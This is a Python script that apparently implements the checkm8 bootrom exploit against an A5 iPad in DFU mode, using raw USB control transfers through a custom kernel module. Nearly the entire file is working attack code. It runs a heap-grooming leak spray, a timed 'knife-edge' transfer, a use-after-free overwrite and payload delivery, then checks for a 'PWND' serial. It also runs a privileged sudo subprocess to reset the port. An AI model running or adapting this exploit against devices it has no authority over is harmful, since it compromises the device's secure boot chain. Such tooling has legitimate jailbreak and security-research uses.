#!/usr/bin/env python3
"""pwn-final3.py — the complete A5 sequence in the partitioned CYC architecture.

Phases (one fresh DFU dance required):
  P1 CYC world:   620x armed-leak CYC spray (wLength 0x80, one 0x40 packet,
                  no status, halt-recovered each time) + 1x wLength 0x81;
                  step-2 controls via module with-status pushes (set-state,
                  zero DNLOAD, 2x GETSTATUS); knife-edge as ONE CYC
                  (DNLOAD wLength 0x700, data exactly 0x6C0, no status).
  P2 heal:        usbfs port reset via a clean subprocess (works post-CYC,
                  measured) - fresh enumeration, kernel world reborn,
                  module hook re-captures.
  P3 CYC world:   crit-IN CYC (wLength 0x81, one packet) -> UAF write CYC
                  (bogus 0x00/0x00 wLength 0x40, 0x40 x 0xCC + 64B overwrite,
                  no status) -> payload CYC (DNLOAD wLength 0x2C0, 0x40 x
                  0xCC + 704B payload, no status) -> final port reset.
  P4 kernel:      fresh verify - the PWND:[checkm8] serial.
"""
import argparse
import importlib.util
import os
import struct
import subprocess
import sys
import time

REPO = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
TOOLS = os.path.join(REPO, 'tools')

sp = importlib.util.spec_from_file_location('pwn', os.path.join(TOOLS, 'checkm8-a5-pwn.py'))
P = importlib.util.module_from_spec(sp)
sp.loader.exec_module(P)

import fcntl
import ctypes

IOC_CYC = (1 << 30) | (32 << 16) | (ord('R') << 8) | 5
IOC_PUSH = (1 << 30) | (32 << 16) | (ord('R') << 8) | 1


def open_raw():
    return os.open('/dev/raw0', os.O_RDWR)


def cyc(fd_raw, setup, data, settle_us=1000):
    arr = (ctypes.c_ubyte * max(len(data), 1)).from_buffer_copy(
        bytes(data) if data else b'\x00')
    txn = struct.pack('<8sIBBHIIQ', bytes(setup), len(data), 1, 1, 0,
                      settle_us, 0, ctypes.addressof(arr))
    try:
        fcntl.ioctl(fd_raw, IOC_CYC, txn, True)
        _ = arr
        return 0
    except OSError as e:
        _ = arr
        return -e.errno


def push(fd_raw, setup, data, has_status=0, dir_in=0):
    arr = (ctypes.c_ubyte * max(len(data), 1)).from_buffer_copy(
        bytes(data) if data else b'\x00')
    txn = struct.pack('<8sI4BQII',
                      bytes(setup), len(data),
                      1 if data else 0, has_status,
                      1 if dir_in else 0, 0,
                      ctypes.addressof(arr), 0, 0)
    try:
        fcntl.ioctl(fd_raw, IOC_PUSH, txn, True)
        _ = arr
        return 0
    except OSError as e:
        _ = arr
        return -e.errno


def port_reset_subprocess():
    """Port reset in a clean isolated process (the post-CYC kernel userspace
    path is dead in the parent; a fresh process + hub path works)."""
    code = (
        "import fcntl,glob,os,time\n"
        "node=None\n"
        "for p in glob.glob('/sys/bus/usb/devices/*/idProduct'):\n"
        "    try:\n"
        "        if open(p).read().strip()=='1227':\n"
        "            d=os.path.dirname(p)\n"
        "            node='/dev/bus/usb/%03d/%03d'%(int(open(d+'/busnum').read()),"
        "int(open(d+'/devnum').read()))\n"
        "            break\n"
        "    except Exception: pass\n"
        "if node:\n"
        "    fd=os.open(node,os.O_RDWR)\n"
        "    try: print('reset rc:',fcntl.ioctl(fd,(0x55<<8)|20,0))\n"
        "    finally: os.close(fd)\n"
        "else: print('no DFU device for reset')\n"
    )
    r = subprocess.run(['sudo', '-n', 'python3', '-c', code],
                       capture_output=True, text=True, timeout=45)
    print(r.stdout.strip())
    time.sleep(2.5)


def mod_state(fd_raw):
    import struct as s
    IOC_STATE = (2 << 30) | (40 << 16) | (ord('R') << 8) | 3
    buf = bytearray(40)
    fcntl.ioctl(fd_raw, IOC_STATE, buf, True)
    f = s.unpack_from('<QIIIIIIII', buf, 0)
    # real order: xhci, slot, ring_addr_lo, num_trbs_free, cycle, state,
    #             trbs_pushed, deq_off, ep0_state
    return f


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('--wait', type=float, default=0.0)
    ap.add_argument('--leak', type=int, default=620)
    args = ap.parse_args()

    payload, overwrite = P.load_payloads('classic')
    print('*** FINAL3: partitioned CYC architecture ***')
    print('payload=%d overwrite=%d' % (len(payload), len(overwrite)))

    if args.wait:
        print('put the iPad in DFU now (fresh dance)')
        syspath, sys_serial = P.sysfs_dfu(timeout=args.wait)
        if syspath is None:
            print('no DFU appeared')
            return 1
        print('DFU arrived:', syspath)
        print('sysfs serial:', sys_serial)
    else:
        _, sys_serial = P.sysfs_dfu(timeout=2.0)
        if not sys_serial:
            print('no DFU on the bus; pass --wait N')
            return 1

    fd_raw = open_raw()
    f = mod_state(fd_raw)
    print('[module] xhci=0x%x slot=%d state=%d' % (f[0], f[1], f[5]))
    if not f[5]:
        print('[module] fresh load but no capture - RE-DANCE needed '
              '(the hook fires at enumeration)')
        return 1

    # ---------------- PHASE 1: CYC spray + knife-edge ------------------
    spray_setup = bytes([0x80, 0x06, 0x03, 0x03, 0x0A, 0x04, 0x80, 0x00])
    t0 = time.time()
    errs = {}
    n_ok = 0
    for i in range(args.leak - 1):
        # sketch-exact leak class: serve the FULL 0x80 data phase, then
        # hold (no status TRB) - the sketch reads 0x80 per leak request.
        rc = cyc(fd_raw, spray_setup, b'\x00' * 0x80)
        if rc == 0:
            n_ok += 1
        else:
            errs[-rc] = errs.get(-rc, 0) + 1
        if (i + 1) % 100 == 0:
            print('[spray] %d/%d ok=%d errs=%r %.1fs'
                  % (i + 1, args.leak - 1, n_ok, errs, time.time() - t0))
    crit_setup = bytes([0x80, 0x06, 0x03, 0x03, 0x0A, 0x04, 0x81, 0x00])
    rc = cyc(fd_raw, crit_setup, b'\x00' * 0x41)
    print('[spray] final 0x81 CYC rc=%d; total ok=%d/%d errs=%r'
          % (rc, n_ok, args.leak - 1, errs))

    # step-2 controls via module with-status pushes
    rc = push(fd_raw, bytes([0x21, 0x01, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00]),
              b'\xCC' * 0x40, has_status=1, dir_in=0)
    print('[s2] set-state (w40 + status): rc=%d' % rc)
    rc = push(fd_raw, bytes([0x21, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]),
              b'', has_status=1, dir_in=0)
    print('[s2] zero DNLOAD (status-only): rc=%d' % rc)
    for n in (1, 2):
        rc = push(fd_raw, bytes([0xA1, 0x03, 0x00, 0x00, 0x00, 0x00, 0x06, 0x00]),
                  b'\x00' * 6, has_status=1, dir_in=1)
        print('[s2] GETSTATUS#%d (IN 6B + status): rc=%d' % (n, rc))

    # THE KNIFE-EDGE: DNLOAD wLength 0x700, exactly 0x6C0 data, no status
    rc = cyc(fd_raw, bytes([0x21, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07]),
             b'\x00' * 0x6C0)
    print('[s2] KNIFE-EDGE CYC (w700/d6C0, no status): rc=%d' % rc)

    # ---------------- PHASE 2: the bus reset (heap persists) -----------
    print('[P2] port reset (heal + re-capture)')
    port_reset_subprocess()
    f = mod_state(fd_raw)
    print('[module] post-reset: slot=%d state=%d' % (f[1], f[5]))
    if not f[5]:
        print('[module] LOST capture after reset; abort')
        return 1

    # ---------------- PHASE 3: stage-3 CYCs -----------------------------
    rc = cyc(fd_raw, bytes([0x80, 0x06, 0x03, 0x03, 0x0A, 0x04, 0x81, 0x00]),
             b'\x00' * 0x41)
    print('[s3] armed crit-IN CYC: rc=%d' % rc)
    time.sleep(0.1)

    data = b'\xCC' * 0x40 + overwrite
    rc = cyc(fd_raw, bytes([0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00]),
             data)
    print('[s3] UAF write CYC: rc=%d' % rc)
    time.sleep(0.3)

    data = b'\xCC' * 0x40 + payload
    rc = cyc(fd_raw, bytes([0x21, 0x01, 0x00, 0x00, 0x00, 0x00, 0xC0, 0x02]),
             data)
    print('[s3] payload CYC: rc=%d' % rc)
    time.sleep(0.5)

    # ---------------- PHASE 4: final reset + kernel verify --------------
    print('[P4] final port reset + verify')
    port_reset_subprocess()

    usb = P.LibUSB()
    P.LibUSB._current = usb
    serial = P.verify(usb)
    print('[verify] serial: %r' % serial)
    if P.PWN_MARKER in serial:
        print('*** PWNED DFU — host-only checkm8 A5 achieved ***')
        os.close(fd_raw)
        return 0
    print('[verify] not pwned - see phases above')
    os.close(fd_raw)
    return 1


if __name__ == '__main__':
    sys.exit(main())
